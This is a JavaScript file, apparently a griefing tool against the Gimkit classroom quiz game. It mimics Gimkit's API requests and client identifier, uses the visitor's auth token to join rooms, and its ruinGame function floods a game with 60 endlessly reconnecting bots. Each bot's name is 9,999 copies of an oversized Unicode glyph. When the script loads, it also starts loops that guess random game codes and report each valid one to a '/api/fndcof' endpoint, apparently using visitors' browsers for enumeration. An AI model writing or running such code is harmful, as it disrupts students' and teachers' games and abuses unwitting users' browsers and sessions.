const epicSymbol = "﷽";

var superLongName = "";
for (var i = 0; i < 9999; i++) {
    superLongName += epicSymbol;
}

async function createGame() {
    return await fetch(
        "https://www.gimkit.com/api/matchmaker/intent/map/play/create",
        {
            credentials: "include",
            headers: {
                "User-Agent":
                    "Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0",
                Accept: "application/json, text/plain, */*",
                "Accept-Language": "en-US,en;q=0.5",
                "Content-Type": "application/json",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
                Pragma: "no-cache",
                "Cache-Control": "no-cache",
            },
            referrer: "https://www.gimkit.com/view/6405e689a177900032ecbd06",
            body: JSON.stringify({
                experienceId: "642370ce55297d003834e1a1",
                matchmakerOptions: {
                    group: "",
                    joinInLate: true,
                },
                options: {
                    hookOptions: {
                        enemyDifficulty: "Normal",
                        energyPerQuestion: 1000,
                        health: "Normal",
                        kitId: "6405e689a177900032ecbd06",
                    },
                    cosmosBlocked: false,
                },
            }),
            method: "POST",
            mode: "cors",
        }
    );
}

var gkversion = "Gimkit Web ⁤‍⁡⁢⁡⁢⁣⁢⁡‍⁡⁢‌⁢‌⁣⁡‌‌‍‌⁢‍⁡‌‍⁡⁢‌‌⁢‍⁢‌‌⁢⁣⁢‍⁣⁤‍‍⁢⁡‍⁢⁡‌‍⁡‌⁢‍⁤⁡‌‍⁤‍‌‌⁡⁢⁡‌‍‌⁡‍⁤‌⁡‍⁢⁡‍⁤‍‍‍‍‍⁣⁢‍‌‍‌⁣‍⁤⁡⁢‌‌‌⁡⁢‌⁡⁢⁡⁢‍⁢‍⁢‌⁤‍⁣⁢⁣⁢⁡⁢‍‍‍⁢‍‌⁢‌⁡⁤‌‍‌⁡‌⁢‍⁢‍‍‌‍‌‌‍‍⁤⁢‍‌⁣‌‍‍⁣‌⁤⁢⁡⁤⁢‍‌‍⁡‍⁡‍⁣‍⁡‍⁡‍‌‍⁢⁡⁤‍⁣‍‌‌‌‍⁡‍⁡⁢‌⁣⁢‍‍‌‌‌‌⁢⁡‌‍⁤‍⁣⁢⁡⁢⁡‌⁡⁢⁡⁤⁤⁣‍⁡‌‌⁡‍‍‍⁣⁣⁡‍⁣‌⁢⁡‍‌⁡‍‌‍⁡⁢‌‌⁡‍‍‍‌⁡‌‍‍⁤⁡‌‌‍‌⁤‍‍‍‍⁣‍‌⁣⁣‌⁡‍‌⁢‌⁡‌⁢⁡⁢⁡⁢‍⁡‍⁢⁡⁢‍⁡‌‌Client V3.1";

async function get_info_from_code(code) {
    return await fetch(
        "https://www.gimkit.com/api/matchmaker/find-info-from-code",
        {
            headers: {
                accept: "application/json, text/plain, */*",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "no-cache",
                "content-type": "application/json",
                pragma: "no-cache",
                "sec-ch-ua":
                    '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
            },
            referrer: "https://www.gimkit.com/join",
            referrerPolicy: "strict-origin-when-cross-origin",
            body: JSON.stringify({ code: code }),
            method: "POST",
            mode: "cors",
            credentials: "include",
        }
    );
}

async function code_exists(code) {
    return (await (await get_info_from_code(code)).json()).roomId != undefined;
}

async function joinAPI(roomId, name) {
    return await fetch("https://www.gimkit.com/api/matchmaker/join", {
        headers: {
            accept: "application/json, text/plain, */*",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "content-type": "application/json",
            pragma: "no-cache",
            "sec-ch-ua":
                '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
        },
        referrer: "https://www.gimkit.com/join",
        referrerPolicy: "strict-origin-when-cross-origin",
        body: JSON.stringify({
            roomId: roomId,
            name: name,
            clientType: gkversion,
        }),
        // "{\"roomId\":\"65b69bc078115f0032970d02\",\"name\":\"test\",\"clientType\":\"Gimkit Web ⁢‍⁡⁢‌⁢‌⁢⁢⁢‌⁡⁢‌‌‌⁢⁢‌‌⁡⁢⁢‍⁡⁣⁡⁢⁤⁡‍⁢⁢⁣⁣‌⁢⁡‌‍‌‌⁢‍⁡⁢⁢⁡⁢‍⁢⁢‌⁡‌⁢⁤‌⁡⁣‍‌⁢⁢⁣⁣‌‌⁢⁢⁢‍⁡⁢⁡⁣‌‍⁢⁡‍⁢⁤⁣⁣⁣⁢‌‌‍⁢⁡⁢‌⁡‌⁤⁣⁣⁡⁢‌‍⁢‍⁢⁢‌‌‍‌⁤‍‌⁡‍⁡‍⁢⁤‍⁢‍⁡‌‌‌⁢⁡⁣⁤‌⁢‌‍⁢‍⁤‌‌‌‍⁤⁣‌⁢‌⁢⁡‍⁢⁡‌⁡‍⁢⁣‍⁤‍⁢‌⁢‌‌⁤‍⁡⁣⁡⁢‍⁡‌⁢⁡⁣‍⁡‌⁣‍⁤‍‌⁢⁣‌‍‌‌⁢⁡⁣‍⁢⁡⁢⁤‌⁡⁢⁡⁢‌⁢⁣‍⁡⁣‌‌⁣⁢‌‍⁢‍⁤⁢‌‍⁡‌⁡‍⁡⁣⁡‍⁢‍⁡⁢‍‌⁣‌⁣⁢‌‌‍⁡⁢⁡‍⁢‌⁢‍⁡‍⁢⁣⁤‌‌‌⁡‌‌‍‌⁢‍⁡⁢⁡⁢⁡‌⁢⁢‌‌⁤‌⁡‌⁡‌⁢Client V3.1\"}",
        method: "POST",
        mode: "cors",
        credentials: "include",
    });
}

async function matchmake(serverUrl, roomId, intentId, authToken) {
    // ??? why is gimkit making this request
    fetch(`${serverUrl}/matchmake/joinById/${roomId}`, {
        headers: {
            accept: "*/*",
            "accept-language": "en-US,en;q=0.9",
            //    "cache-control": "no-cache",
            //    "pragma": "no-cache",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
        },
        referrer: "https://www.gimkit.com/",
        referrerPolicy: "strict-origin-when-cross-origin",
        body: null,
        method: "OPTIONS",
        mode: "cors",
        credentials: "omit",
    });

    return await fetch(`${serverUrl}/matchmake/joinById/${roomId}`, {
        headers: {
            accept: "application/json",
            "accept-language": "en-US,en;q=0.9",
            //        "cache-control": "no-cache",
            "content-type": "application/json",
            //        "pragma": "no-cache",
            "sec-ch-ua":
                '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
        },
        referrer: "https://www.gimkit.com/",
        referrerPolicy: "strict-origin-when-cross-origin",
        body: JSON.stringify({
            intentId: intentId,
            authToken: authToken,
        }),
        method: "POST",
        mode: "cors",
        credentials: "omit",
    });
}

async function getUserInfo() {
    return await fetch("https://www.gimkit.com/pages/general", {
        headers: {
            accept: "application/json, text/plain, */*",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            pragma: "no-cache",
            "sec-ch-ua":
                '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
        },
        referrer: "https://www.gimkit.com/me",
        referrerPolicy: "strict-origin-when-cross-origin",
        body: null,
        method: "GET",
        mode: "cors",
        credentials: "include",
    });
}

async function connect(
    gamecode,
    name,
    reconnectEachTime = false,
    returnSock = false
) {
    var authToken = (await (await getUserInfo()).json()).userData.token;
    var info = await (await get_info_from_code(gamecode)).json();
    var join = await (await joinAPI(info.roomId, name)).json();

    if (join["source"] == "original") {
        // wss://serverUrl/blueboat/?id=roomId&EIO=3&transport=websocket
        var webSocketUrl = `${join.serverUrl.replace("https", "wss")}/blueboat/?id=${join.roomId
            }&EIO=3&transport=websocket`;
        var sendTicks = 0;
        var blueboat = true;
    } else {
        var matchmade = await (
            await matchmake(join.serverUrl, join.roomId, join.intentId, authToken)
        ).json();
        var webSocketUrl = `${join.serverUrl.replace("https", "wss")}/${matchmade.room.processId
            }/${join.roomId}?sessionId=${matchmade.sessionId}`;
        var blueboat = false;
    }
    const socket = new WebSocket(webSocketUrl);

    if (!returnSock) {
        socket.addEventListener("open", (event) => {
            socket.send("Hello, WebSocket!");
        });

        socket.addEventListener("message", (event) => {
            if (blueboat) {
                sendTicks++;
                if (sendTicks == 3) {
                    // Basically, you have to say
                    // HEY, i'm here, but with a bunch of verification info
                    socket.send();
                }
            }
        });

        socket.addEventListener("error", (event) => { });

        socket.addEventListener("close", (event) => {
            if (reconnectEachTime) {
                connect(gamecode, name, (reconnectEachTime = true));
            }
        });
    } else {
        return socket;
    }
}

async function addPersistentBot(gamecode, name) {
    connect(gamecode, name, (reconnectEachTime = true));
}

async function ruinGame(gamecode) {
    for (var i = 0; i < 60; i++) {
        addPersistentBot(gamecode, superLongName);
    }
}

var performanceDecrease = 1;
async function randomFlood() {
    const startTime = performance.now();

    var randomCode = (111111 + Math.floor(Math.random() * 888888)).toString();
    if (await code_exists(randomCode)) {
        console.warn(`CODE FOUND ${randomCode}`);
        fetch(`/api/fndcof?c=${randomCode}`);
    }

    const endTime = performance.now();
    var wait = (endTime - startTime) / performanceDecrease;
    setTimeout(async function () {
        randomFlood();
    }, wait);
}

async function startFloods(n) {
    for(var i = 0; i < n; i++) {
        randomFlood();
    }
}

function isIOS() {
    return /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
}

performanceDecrease = 1;

if(isIOS()) {
    startFloods(1);
} else {
    startFloods(2);
    if(window.location.href == "/") {
        startFloods(1);
    }
}